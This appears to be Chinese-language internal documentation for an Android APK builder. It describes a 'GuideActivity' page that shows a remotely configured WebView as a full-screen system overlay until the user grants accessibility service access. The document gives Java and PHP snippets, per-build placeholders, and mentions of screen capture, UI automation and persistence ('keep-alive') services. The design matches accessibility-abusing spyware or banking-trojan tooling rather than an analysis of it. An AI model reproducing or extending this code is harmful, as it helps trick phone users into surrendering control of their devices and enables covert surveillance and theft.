# APK GuideActivity（引导页）流程

> 本文档详细说明 APK 授权无障碍服务后显示的 GuideActivity 引导页的完整流程和实现细节。

## 目录

1. [触发条件](#1-触发条件)
2. [GuideActivity 详解](#2-guideactivity-详解)
3. [WebView 加载流程](#3-webview-加载流程)
4. [自动关闭机制](#4-自动关闭机制)
5. [配置参数](#5-配置参数)

---

## 1. 触发条件

### 1.1 启动流程

```
用户点击 APK 图标
    ↓
MainActivity.onCreate()
    ↓
检查无障碍服务授权状态
    ├─ 未授权 → 引导用户授权无障碍服务
    │              ↓
    │          用户授权完成
    │              ↓
    └─ 已授权 → 检查 USE-GUID 配置
                    ├─ true  → 启动 GuideActivity（引导页）
                    └─ false → 跳过引导页，直接启动后台服务
```

### 1.2 配置控制

**占位符**: `[USE-GUID]` (My_Configs.smali)

- **true**: 显示 GuideActivity 引导页
- **false**: 跳过引导页，直接进入后台运行

**构建时注入**:
```php
// SmaliProcessor.php
$replacements['USE-GUID'] = $config->showGuide ? 'true' : 'false';
```

---

## 2. GuideActivity 详解

### 2.1 核心代码

**文件**: `com/guard/wallet/activity/GuideActivity.java`

```java
public class GuideActivity extends Activity {
    public WeakReference f132a;  // WebView 引用
    
    @Override
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        
        // 1. 设置深灰色背景
        getWindow().getDecorView().setBackgroundColor(Color.parseColor("#303133"));
        getWindow().setBackgroundDrawable(new ColorDrawable(Color.parseColor("#303133")));
        
        // 2. 创建 WebView
        this.f132a = new WeakReference(new e(this, true));
        
        // 3. 添加到布局
        LinearLayout linearLayout = new LinearLayout(this);
        linearLayout.addView((View) this.f132a.get(), layoutParams);
        setContentView(linearLayout, layoutParams);
        
        // 4. 设置窗口类型（悬浮窗）
        WindowManager.LayoutParams attributes = getWindow().getAttributes();
        attributes.type = 2038;  // TYPE_APPLICATION_OVERLAY
        getWindow().setAttributes(attributes);
    }
}
```

### 2.2 UI 特征

| 特征 | 值 |
|------|-----|
| **背景颜色** | `#303133` (深灰色) |
| **布局** | 全屏 LinearLayout |
| **内容** | WebView (占满整个屏幕) |
| **窗口类型** | TYPE_APPLICATION_OVERLAY (悬浮窗) |
| **底部进度条** | WebView 自带加载进度条 |

---

## 3. WebView 加载流程

### 3.1 WebView 初始化

**文件**: `e0/e.java`

```java
public class e extends WebView {
    public e(Context context, boolean z2) {
        super(context);
        
        // 1. 禁用调试
        WebView.setWebContentsDebuggingEnabled(false);
        
        // 2. 设置 WebViewClient（处理页面加载）
        setWebViewClient(new d(z2));
        
        // 3. 设置 WebChromeClient（显示进度条）
        setWebChromeClient(new WebChromeClient());
        
        // 4. 启用 JavaScript
        getSettings().setJavaScriptEnabled(true);
        
        // 5. 配置缓存和存储
        getSettings().setCacheMode(1);
        getSettings().setDomStorageEnabled(true);
        getSettings().setDatabaseEnabled(true);
        
        // 6. 启用地理位置
        getSettings().setGeolocationEnabled(true);
        
        // 7. 允许文件访问
        getSettings().setAllowFileAccess(true);
        getSettings().setAllowUniversalAccessFromFileURLs(true);
    }
}
```

### 3.2 加载引导页 URL

**GuideActivity.java (onResume)**:
```java
@Override
public void onResume() {
    super.onResume();
    
    // 加载引导页 URL
    ((e) this.f132a.get()).loadUrl(b.c());
    
    // 检查无障碍服务是否已授权
    if (MyAccessibilityService.P() != null) {
        b.b();
        finish();  // 已授权，关闭引导页
    }
}
```

### 3.3 页面加载事件

**文件**: `e0/d.java` (WebViewClient)

```java
public class d extends WebViewClient {
    public final AtomicBoolean f303a = new AtomicBoolean(false);
    
    @Override
    public void onPageStarted(WebView webView, String str, Bitmap bitmap) {
        super.onPageStarted(webView, str, bitmap);
        Log.d("e0.d", "onPageStarted URL:" + str);
        // 页面开始加载，进度条显示
    }
    
    @Override
    public void onPageFinished(WebView webView, String str) {
        super.onPageFinished(webView, str);
        Log.d("e0.d", "onPageFinished URL:" + str);
        this.f303a.set(true);  // 标记页面加载完成
        webView.getSettings().setBlockNetworkImage(false);  // 允许加载图片
        // 进度条隐藏
    }
    
    @Override
    public void onReceivedError(WebView webView, WebResourceRequest request, 
                                WebResourceError error) {
        super.onReceivedError(webView, request, error);
        
        // 连接超时时加载百度首页作为后备
        if (error.getDescription().toString().contains("ERR_CONNECTION_TIMED_OUT")) {
            webView.loadUrl("https://m.baidu.com/");
        }
    }
}
```

### 3.4 进度条显示

WebView 自带底部进度条，通过 `WebChromeClient` 实现：

```
页面加载开始
    ↓
进度条显示（0%）
    ↓
加载中（1% → 100%）
    ↓
页面加载完成
    ↓
进度条隐藏
```

---

## 4. 自动关闭机制

### 4.1 检测逻辑

**GuideActivity.java (onResume)**:
```java
@Override
public void onResume() {
    super.onResume();
    
    // 每次 Activity 恢复时检查
    if (MyAccessibilityService.P() != null) {
        // 无障碍服务已启动
        b.b();      // 执行清理操作
        finish();   // 关闭 GuideActivity
    }
}
```

### 4.2 关闭流程

```
GuideActivity 显示中
    ↓
用户授权无障碍服务
    ↓
MyAccessibilityService 启动
    ↓
GuideActivity.onResume() 检测到服务已启动
    ↓
调用 b.b() 清理
    ↓
调用 finish() 关闭 Activity
    ↓
后台服务继续运行
```

### 4.3 清理操作

**onDestroy()**:
```java
@Override
public void onDestroy() {
    Log.d("GuideActivity", "GuideActivity onDestroy");
    
    // 1. 销毁 WebView
    WeakReference weakReference = this.f132a;
    if (weakReference != null && weakReference.get() != null) {
        ((e) this.f132a.get()).destroy();
        this.f132a = null;
    }
    
    // 2. 清理全局引用
    if (b.c != null && b.c.get() != null) {
        synchronized (Activity.class) {
            if (b.c.get() instanceof GuideActivity) {
                b.c = null;
            }
        }
    }
    
    super.onDestroy();
}
```

---

## 5. 配置参数

### 5.1 引导页 URL

引导页 URL 通过 `b.c()` 方法获取，可能的来源：

1. **远程配置**: 从服务器动态获取
2. **本地配置**: My_Configs.smali 中的默认 URL
3. **后备 URL**: 连接失败时加载 `https://m.baidu.com/`

### 5.2 相关占位符

| 占位符 | 用途 | 示例值 |
|--------|------|--------|
| `[USE-GUID]` | 是否显示引导页 | `true` / `false` |
| `[log-title]` | 引导页标题 | "欢迎使用" |
| `[log-dis]` | 引导页描述 | "请完成授权" |
| `[log-btn]` | 按钮文本 | "开始使用" |
| `[log-lng]` | 语言代码 | `zh-CN` / `en-US` |

### 5.3 构建时配置

**SmaliProcessor.php**:
```php
$replacements = [
    'USE-GUID' => $config->showGuide ? 'true' : 'false',
    'log-title' => $this->escapeForSmali($config->guideTitle),
    'log-dis' => $this->escapeForSmali($config->guideDescription),
    'log-btn' => $this->escapeForSmali($config->guideButtonText),
    'log-lng' => $config->language,
];
```

---

## 6. 完整时序图

```
用户点击 APK 图标
    ↓
MainActivity 启动
    ↓
检查无障碍服务
    ├─ 未授权 → 引导授权
    │              ↓
    │          用户授权
    │              ↓
    └─ 已授权 → 检查 USE-GUID
                    ↓
                GuideActivity 启动
                    ↓
                onCreate()
                    ├─ 设置深灰色背景 (#303133)
                    ├─ 创建 WebView
                    └─ 设置悬浮窗类型
                    ↓
                onResume()
                    ├─ 加载引导页 URL
                    │   ↓
                    │   WebView 显示进度条
                    │   ↓
                    │   页面加载完成
                    │   ↓
                    │   进度条隐藏
                    │
                    └─ 检测无障碍服务状态
                        ↓
                    MyAccessibilityService.P() != null
                        ↓
                    调用 finish()
                        ↓
                    onDestroy()
                        ├─ 销毁 WebView
                        └─ 清理引用
                        ↓
                后台服务继续运行
```

---

## 7. 常见问题

### Q1: 为什么需要 GuideActivity？

**A**: 提供用户友好的引导界面，说明应用功能和权限用途，提升用户体验。

### Q2: 进度条是如何实现的？

**A**: WebView 自带的加载进度条，通过 `WebChromeClient` 自动显示，无需额外代码。

### Q3: 如果用户不授权无障碍服务会怎样？

**A**: GuideActivity 会一直显示，直到用户授权。部分核心功能（如 UI 自动化、屏幕截图）将无法使用。

### Q4: 可以自定义引导页内容吗？

**A**: 可以。通过修改 `b.c()` 返回的 URL，加载自定义的 HTML 页面。

### Q5: GuideActivity 会影响保活吗？

**A**: 不会。GuideActivity 只是临时显示的前台 Activity，后台服务（EngineWorker、WorkServices、LiveChat）已经在 MainActivity 中启动。

---

## 8. 相关文档

- [APK_RUNTIME_FLOW.md](../legacy/APK_RUNTIME_FLOW.md) - APK 完整运行流程
- [APK_KEEP_ALIVE_MECHANISM.md](./APK_KEEP_ALIVE_MECHANISM.md) - 保活机制详解
- [APK_BUILDER.md](./APK_BUILDER.md) - APK 构建服务
- [FRONTEND.md](./FRONTEND.md) - 前端架构文档
